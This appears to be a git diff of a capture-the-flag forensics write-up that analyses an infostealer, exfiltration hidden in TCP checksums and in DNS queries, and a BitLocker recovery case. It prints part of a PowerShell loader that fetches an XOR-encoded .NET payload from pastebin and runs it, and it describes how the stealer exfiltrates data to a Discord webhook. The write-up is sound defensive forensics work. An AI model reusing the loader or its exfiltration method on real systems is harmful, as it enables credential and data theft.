@@ -10,19 +10,19 @@ lang: 'em'
 ---
 # CSCV2025 Quals 
 Author: KAiZ3n
-![image](https://hackmd.io/_uploads/SkVt48wCxe.png)
+![image](/images/hackmd/SkVt48wCxe.png)
 
 # NostalgiaS
-![image](https://hackmd.io/_uploads/H1kfCU80ex.png)
+![image](/images/hackmd/H1kfCU80ex.png)
 
 The challenge description does not specify the initial access vector, so we will proceed with a filesystem examination to gather more information.
 
 First, I examined the machine's `winevtx` logs and found a suspicious PowerShell command with Event ID 400.
-![image](https://hackmd.io/_uploads/SyELgKLAee.png)
-![image](https://hackmd.io/_uploads/SyJ47YLCgl.png)
+![image](/images/hackmd/SyELgKLAee.png)
+![image](/images/hackmd/SyJ47YLCgl.png)
 
 The script decodes a hex payload and decrypts it via XOR.
-![image](https://hackmd.io/_uploads/SkNuQtLAge.png)
+![image](/images/hackmd/SkNuQtLAge.png)
 ```powershell
 $AssemblyUrl = "https://pastebin.com/raw/90qeYSHA"
 $XorKey = 0x24
@@ -61,10 +61,10 @@ try {
 The script proceeds to download a malicious .NET assembly, XORs the payload with `0x24`, and executes it using `Assembly.Load`.
 URL : https://pastebin.com/raw/90qeYSHA
 Name : "StealerJanai.core.RiderKick"
-![image](https://hackmd.io/_uploads/Syf74KLAlx.png)
+![image](/images/hackmd/Syf74KLAlx.png)
 
 Starting the analysis with ILSpy, we look into `StealerJani.Main()`.
-![image](https://hackmd.io/_uploads/BJkKBF80ll.png)
+![image](/images/hackmd/BJkKBF80ll.png)
 
 **Execution Flow Summary:**
 Main -> Run -> Initializes RiderKick constructor -> Sets up a Discord webhook URL and calls the AutoRun function.
@@ -106,8 +106,8 @@ private void AutoRun()
 It will collect specified system and browser data and exfiltrate them to Discord, which acts as a C2, using the Webhook URL.
 
 In `systemInformation.collectionSystemInfo()`, it collects `secretInformation`.
-![image](https://hackmd.io/_uploads/rkIYPt8Rgx.png)
-![image](https://hackmd.io/_uploads/SJRcDY8Cle.png)
+![image](/images/hackmd/rkIYPt8Rgx.png)
+![image](/images/hackmd/SJRcDY8Cle.png)
 
 The hardcoded strings are decoded through a function and assembled in the format: `text + machineName + "_" + text2 + registryValue + "}"`.
 
@@ -171,10 +171,10 @@ private string DecodeMagicToString(string input)
 
 ```
 Proceeding to decode the hardcoded strings and retrieve the MachineName as well as the registry value from `SOFTWARE\hensh1n`.
-![image](https://hackmd.io/_uploads/ByH2stICle.png)
+![image](/images/hackmd/ByH2stICle.png)
 
 SYSTEM machine Name value:
-![image](https://hackmd.io/_uploads/H1NMhFLCgx.png)
+![image](/images/hackmd/H1NMhFLCgx.png)
 
 Two hardcoded Base62 strings:
 -> CSCV2025{your_computer_
@@ -203,17 +203,17 @@ The malware, `StealerJanai`, is an infostealer. Upon execution, it gathers syste
 
 # Case AlphaS
 
-![image](https://hackmd.io/_uploads/ryWylcU0le.png)
-![image](https://hackmd.io/_uploads/SkXGlcI0lg.png)
+![image](/images/hackmd/ryWylcU0le.png)
+![image](/images/hackmd/SkXGlcI0lg.png)
 
 According to the description, we have a timeline for the incident response, an attacker's drive, and an external drive from the victim that has been encrypted with BitLocker.
 We observed that the Windows user downloaded artifacts recently, likely within the timeframe of the incident.
-![image](https://hackmd.io/_uploads/Hk8hbqUAel.png)
+![image](/images/hackmd/Hk8hbqUAel.png)
 
 I will focus on application artifacts first. SimpleNote seems likely to contain important notes.
 Reading the cache for SimpleNote, ChatGPT, and Firefox did not initially yield any results. I was stuck on this for a while, but upon further investigation, I found that logs from SimpleNote and ChatGPT were saved in plaintext.
-![image](https://hackmd.io/_uploads/B1_SIVD0gg.png)
-![image](https://hackmd.io/_uploads/H1Wd8NPCll.png)
+![image](/images/hackmd/B1_SIVD0gg.png)
+![image](/images/hackmd/H1Wd8NPCll.png)
 
 **Log Paths:**
 *   `%APPDATA%\Local\Microsoft\Packages\22490Automattic.Simplenote_9h07f78gwnchp\LocalCache\Roaming\SimpleNote\IndexedDB\file__0.indexeddb.leveldb\0003.log`
@@ -222,15 +222,15 @@ Reading the cache for SimpleNote, ChatGPT, and Firefox did not initially yield a
 **Findings:**
 *   Obtained Gmail address: `tangthanhvan56@gmail.com`
 *   Obtained a password for a zip file.
-![iamge](https://hackmd.io/_uploads/rJd8tVP0gx.png)
+![iamge](/images/hackmd/rJd8tVP0gx.png)
 
-![image](https://hackmd.io/_uploads/BkMbbrwCel.png)
+![image](/images/hackmd/BkMbbrwCel.png)
 
 *   Obtained the BitLocker recovery key from ChatGPT logs. Used Autopsy to read the external drive.
 
 After decrypting with the recovery key, we found a `secret.zip` file. Using the password recovered from the SimpleNote logs, we unzipped the file.
-![image](https://hackmd.io/_uploads/SkHfnNDRge.png)
-![image](https://hackmd.io/_uploads/HJqO3NP0gx.png)
+![image](/images/hackmd/SkHfnNDRge.png)
+![image](/images/hackmd/HJqO3NP0gx.png)
 
 Reading the `ssh.txt` file revealed a link to Pastebin.
 ```
@@ -239,7 +239,7 @@ https://pastebin.com/WciYiDEs
 
 cff4c6f0b68c31cb
 ```
-![image](https://hackmd.io/_uploads/Sy4hnVDAgg.png)
+![image](/images/hackmd/Sy4hnVDAgg.png)
 
 And we obtained the flag.
 
@@ -259,7 +259,7 @@ And we obtained the flag.
 
 # CovertS
 
-![image](https://hackmd.io/_uploads/HJXUZHPAel.png)
+![image](/images/hackmd/HJXUZHPAel.png)
 
 Based on the challenge description, the scenario involves data exfiltration, and the provided PCAP file is quite large.
 
@@ -305,12 +305,12 @@ Interface #0 info:
 Due to the large file size, I segregated the traffic into three smaller files based on protocol: TCP, UDP, and ICMP.
 
 Upon analyzing the ICMP traffic, I identified exfiltration attempts. However, the payloads consisted solely of the character "A," suggesting a potential diversion or an attempt to create noise and obstruct the analysis.
-![image](https://hackmd.io/_uploads/rJ9ONBwRge.png)
+![image](/images/hackmd/rJ9ONBwRge.png)
 
 Therefore, I decided to deprioritize the ICMP traffic.
 
 The UDP traffic primarily consisted of the QUIC protocol. Payloads transmitted over QUIC are heavily encrypted, and there were no discernible signs of data exfiltration.
-![image](https://hackmd.io/_uploads/BkUISHvAxx.png)
+![image](/images/hackmd/BkUISHvAxx.png)
 
 Consequently, the investigation shifted its focus to the TCP protocol.
 
@@ -318,7 +318,7 @@ Consequently, the investigation shifted its focus to the TCP protocol.
 
 Drawing inspiration from the referenced blog post, my initial approach was to filter for TCP SYN packets on ports other than 443. This strategy aimed to exclude HTTPS traffic, where the TLS handshake occurs over port 443, thereby narrowing the scope of the investigation.
 
-![image](https://hackmd.io/_uploads/SJkRDSvAxe.png)
+![image](/images/hackmd/SJkRDSvAxe.png)
 
 In a packet with source IP `192.168.203.91` and destination IP `192.168.192.1`, using ports 20981 and 3239, I observed that the TCP checksum field contained two characters that appeared to be part of a Base64 encoded string. I proceeded to dump this data using `tshark`.
 
@@ -353,8 +353,8 @@ Flag: `CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag
 
 
 # DNS Exfil
-![image](https://hackmd.io/_uploads/Sk0V9SDRxe.png)
-![image](https://hackmd.io/_uploads/Hyl_qHvAxl.png)
+![image](/images/hackmd/Sk0V9SDRxe.png)
+![image](/images/hackmd/Hyl_qHvAxl.png)
 
 This report details the analysis of a data exfiltration attempt using DNS queries. The investigation focuses on dissecting network traffic and correlating it with server logs to understand the attacker's methodology.
 
@@ -364,7 +364,7 @@ The investigation began by examining the provided PCAP file (`10.10.0.53_ns_capt
 ┌──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/dns_exfil (1)]
 └─$ tshark -r "dnsexfil/10.10.0.53_ns_capture.pcap" -Tfields -e dns.qry.name
 ```
-![image](https://hackmd.io/_uploads/ByzNsBwRee.png)
+![image](/images/hackmd/ByzNsBwRee.png)
 
 Suspicious queries to a domain, `cloudflar3.com`, were identified. The following command was used to filter for these specific queries and extract relevant metadata, including the full query name, source/destination IPs, and timestamp.
 ```
@@ -390,14 +390,14 @@ The subdomains appeared to be hex-encoded data. The timeline of these events, st
 Pivoting to the destination IP address, `10.10.5.80`, an analysis of server logs was conducted. The access and error logs for the webserver were found to have entries corresponding to the timeline of the suspicious DNS traffic.
 
 The access log revealed a connection to an administrative page from the IP address `10.55.1.77`.
-![image](https://hackmd.io/_uploads/S1U5THP0ll.png)
+![image](/images/hackmd/S1U5THP0ll.png)
 
 Simultaneously, the error log showed a large file upload error directed at `intra.portal.local`. This indicates a potential web shell upload or data staging attempt.
-![image](https://hackmd.io/_uploads/HkBoASwRge.png)
+![image](/images/hackmd/HkBoASwRge.png)
 
 Further investigation of the `intra.portal.local` domain confirmed the upload of a PHP web shell named `getfile.php`.
-![image](https://hackmd.io/_uploads/H1RaJUPCeg.png)
-![image](https://hackmd.io/_uploads/Sk-mgLP0xx.png)
+![image](/images/hackmd/H1RaJUPCeg.png)
+![image](/images/hackmd/Sk-mgLP0xx.png)
 
 ## Decryption of Exfiltrated Data
 A debug variable found on the server provided the key to understanding the exfiltrated data:
@@ -407,7 +407,7 @@ A debug variable found on the server provided the key to understanding the exfil
 This indicates that the exfiltrated data seen in the DNS query subdomains is likely encrypted. The payload is constructed using an AES key derived from the SHA256 hash of the `APP_SECRET`.
 
 The structure of the DNS payload was analyzed.
-![image](https://hackmd.io/_uploads/S15sW8v0ge.png)
+![image](/images/hackmd/S15sW8v0ge.png)
 
 The hex-encoded string in the subdomain is split to separate the ciphertext from another component, possibly an IV or a MAC.
 ```python
@@ -418,6 +418,6 @@ The hex-encoded string in the subdomain is split to separate the ciphertext from
 5769179ccdf950443501d9978f52ddb5
 ```
 By using the discovered `APP_SECRET` and understanding the payload structure, the encrypted data can be reconstructed and decrypted.
-![image](https://hackmd.io/_uploads/SJcqbLPCxe.png)
+![image](/images/hackmd/SJcqbLPCxe.png)
 
 ```
